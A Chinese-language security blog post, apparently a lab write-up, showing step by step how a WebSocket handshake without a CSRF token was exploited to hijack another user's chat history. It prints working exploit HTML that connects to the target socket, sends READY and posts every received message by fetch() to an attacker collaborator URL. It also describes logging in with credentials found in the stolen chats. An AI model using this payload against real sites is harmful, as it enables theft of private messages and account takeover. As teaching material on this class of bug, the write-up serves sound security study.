#  【WebSocket漏洞漫谈-第五章】实战｜WebSocket-CSRF劫持漏洞从发现到利用，手把手教你复现  
原创 升斗安全XiuXiu
                    升斗安全XiuXiu  升斗安全   2026-03-22 23:50  
  
**【文章说明】**  
- **目的**  
：本文内容仅为网络安全**技术研究与教育**  
目的而创作。  
  
- **红线**  
：严禁将本文知识用于任何**未授权**  
的非法活动。使用者必须遵守《网络安全法》等相关法律。  
  
- **责任**  
：任何对本文技术的滥用所引发的**后果自负**  
，与本公众号及作者无关。  
  
- **免责**  
：内容仅供参考，作者不对其准确性、完整性作任何担保。  
  
**阅读即代表您同意以上条款。**  
  
****  
大家好，我是升斗安全。今天这边就给大家分享上一章[【WebSocket漏洞漫谈-第四章】不止 XSS！WebSocket 中的 CSRF 漏洞：握手请求如何成为攻击者的“后门”？](https://mp.weixin.qq.com/s?__biz=MjM5MzM0MTY4OQ==&mid=2447798041&idx=1&sn=f96aa90a273ac0a16c798cf2a4a9507b&scene=21#wechat_redirect)  
中承诺的案例。  
  
今天就给大家分享一次让我印象深刻的漏洞挖掘实验。整个过程不算复杂，但思路很有意思——利用  
WebSocket握手时缺少  
CSRF校验的缺陷，构造恶意页面，最终成功拿到了受害者的聊天记录，甚至还包括了登录凭证。  
  
下面我就用第一人称的方式，把这次操作完整记录下来。  
  
一、漏洞是怎么被我盯上的  
  
这次的目标是一个带实时聊天功能的网站。我像普通用户一样，点开“Live chat”，随便发了一条消息，功能一切正常。但我心里清楚，这种实时通信往往藏着机会。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGELw7nXAczf7hRhia7sia1xcVhXkQia2XBQb8TwBe5cgPa3BZia2pdNcT6zJVTicl2lIMqicXkUB5iaQh9ahjNUZuIjRNkMZCKSxUaI9M/640?wx_fmt=png&from=appmsg "")  
  
我打开了Burp Suite，刷新了一下聊天页面，开始观察流量。  
  
在   
WebSockets history 标签里，我注意到一条叫 "READY" 的命令——它像是用来拉取历史聊天记录的。也就是说，只要连接上WebSocket并发送这个命令，服务器就会把之前的聊天内容全部返回。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGGcgpmJAPqyCw5JYDIUVTyOlP7VrBpEbLr6Yt6YjtD1Z9qeqnCicicU9OprRDP1WianbPq9LU8MYL15oXiaibgiawrDQDPmnQSoZ2lfg/640?wx_fmt=png&from=appmsg "")  
  
这就很有意思了。  
  
我赶紧切到 HTTP history 标签，找到了建立  
WebSocket连接的那条握手请求。仔细一看，请求里没有任何  
CSRF Token。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGFN5J3ABQicPiaYNyIqtYCUmC5bVaKIy59Uib9JtsJUXNQt8DjhtNA7tPklNI44ntZupatRaC2XH1ObE25ibb9u0RQyO4kcmEf3ykM/640?wx_fmt=png&from=appmsg "")  
  
这意味着什么？意味着这个连接请求，可以被任意第三方网站伪造——只要用户浏览器发出请求，服务器就认。  
  
一个典型的  
CSRF漏洞，只不过这次发生在  
WebSocket上。  
  
二、开始动手构造攻击代码  
  
我复制了那条握手请求的URL，格式大概是这样的：  
  
wss://xxxx.test.net/chat  
  
接下来，我打开了   
Exploit Server（漏洞利用服务器），准备放一段恶意代码。  
  
我写了下面这段HTML，贴在请求体部分：  
```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```  
  
这段代码的逻辑很简单：  
- 一旦有人访问这个页面，就会自动向目标服务器发起WebSocket连接；  
  
- 连接成功后，立刻发送 READY 命令，拉取聊天记录；  
  
- 每收到一条记录，就通过 fetch 发送到我指定的服务器上。  
  
  
当然，这里有两个地方需要替换：  
- your-websocket-url：换成我刚才复制的那条wss地址。  
  
- your-collaborator-url：换成我在Burp Collaborator里生成的一个临时地址，用来接收窃取的数据。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGEq2cuE262HWoEsNwTYYSqfCPAd4hKoJpaX5vecvQ63caictgyE35G7g0XPBEXZJ19aOdyUJZnhDa4DVKHIPibwJC288kV46Rmr4/640?wx_fmt=png&from=appmsg "")  
  
  
  
三、先在自己身上试一把  
  
写完之后，我先没急着发给“受害者”，而是自己点了一下 View exploit，看看能不能跑通。  
  
然后回到Burp的 Collaborator 标签，点了一下 Poll now。  
  
几秒钟后，真的收到了几条HTTP请求。点开一看，请求体里赫然是我自己的聊天记录，JSON格式，整整齐齐。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGFck1CRf8sjzj58GCOOc88Q9t3kc2iawibtdWKFkwQDeXVdFI0HPQt4v8iarRODQLou07786Dtc54u4PAX4BiaxDFynd64WibaUkAUk/640?wx_fmt=png&from=appmsg "")  
  
我松了口气——攻击逻辑没问题，可以继续了。  
  
四、把“饵”丢出去  
  
我回到Exploit Server，将刚经过验证的构建好的脚本地址发送给可能的受害者。  
  
这一步是模拟攻击者把恶意链接发给目标用户。在真实场景中，可能是一个钓鱼邮件、一个伪装页面，或者其他诱导点击的方式。  
  
等了大概一两分钟，我再次在  
Collaborator里   
Poll now。  
  
这次收到的请求明显多了不少，内容也不再是我的聊天记录，而是另一个用户的——我成功“劫持”到了受害者的聊天数据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGHot21assIznxDWkyXLTMib1kroXbB7XnpBHH31qGziaNicp496D7RFG0IpmJfJNPV6bpOS8Rzj2xHvBozSkHqib77ia15wcCMIpib0Q/640?wx_fmt=png&from=appmsg "")  
  
五、意外收获：账号密码直接送上门  
  
我开始一条条翻这些JSON格式的聊天记录。本来以为也就是些日常对话，没想到翻到某一条时，内容里赫然写着：  
  
text  
  
username: carlos  
  
password: ********  
  
好家伙，连登录凭证都在聊天里明文传了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/qg1MKHx3jGFib5dz7Jtb6d4iatBWSrgwIxIialdGIXXA1rwpSC4ibuib7najP5Yny6xpUeia6gF6icY07tNrrD4aoZmzUjYickXdWSpoz9x6jR6mKoM/640?wx_fmt=png&from=appmsg "")  
  
我拿着这组用户名和密码，回到目标网站，直接登录了carlos的账户。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qg1MKHx3jGFGV5l9MrOUDNb505gJ1OqfoMq6J3EpoIJpbj559lCwBhJYYmWp7zrkZJKt75Ck2OwViarSoGZoLblZ7qajKxQa41TDRDWHtA4g/640?wx_fmt=png&from=appmsg "")  
  
六、总结一下这个漏洞的本质  
  
整个过程走下来，其实核心就两点：  
- WebSocket握手请求没有CSRF保护  
  
- 服务器不会校验这个连接请求是不是用户本人主动发起的。  
  
  
敏感操作（  
拉取聊天记录）不需要二次验证，只要连接建立成功，发送 READY 就能拿到全部聊天内容。  
  
两者一结合，就构成了一个典型的 跨站  
WebSocket劫持 漏洞。  
  
这种漏洞在实战中并不少见，尤其是在一些快速上线的聊天、客服、实时协作功能里，开发人员往往会忽略对WebSocket连接的身份校验。  
  
好了，今天这一节就先聊到这儿。  
  
如果你平时也接触过 WebSocket 相关的漏洞，或者遇到过什么有意思的场景，欢迎在评论区聊聊——现在 WebSocket 用得越来越广，多交流总没坏处。  
  
最后，如果觉得这篇内容对你有一点点启发，点赞、分享、关注随便给一个，都是对我很大的鼓励。  
  
  
